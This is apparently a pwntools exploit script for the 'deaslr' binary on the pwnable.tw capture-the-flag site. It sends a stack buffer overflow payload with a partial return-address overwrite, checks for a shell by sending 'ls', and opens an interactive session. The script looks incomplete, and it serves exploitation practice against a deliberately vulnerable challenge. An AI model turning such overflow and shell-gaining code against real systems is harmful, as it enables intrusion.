#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('deaslr_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*0x40054A
        b*gets+201
        c
        ''')
        sleep(1)

def open_process():
    # nc chall.pwnable.tw 10402
    if args.REMOTE:
        return remote('chall.pwnable.tw', 10402)
    else:
        return process([exe.path])

ret2get = 0x40053E 
def way1():
     # get arbitrary write in bss in second load
        load = flat(
            b'a'*0x10, 
            0xdeadbeef,
            p16(0x0567), p8(0xef)
        )
        GDB()
        input("send")

        sl(load)

context.log_level = 'error'
b = 0
while(b<1):
    b += 1
    print(f'Attempt: {b}', end='\r')
    p = open_process()
    way1()
    try:
        sl(b'ls')

        a = r(1)
        if a:
            context.log_level = 'info'
            info(f'Success at attempt: {b}')
            break
        else:
            p.close()
            continue


    except EOFError:
        p.close()
        continue

p.interactive()
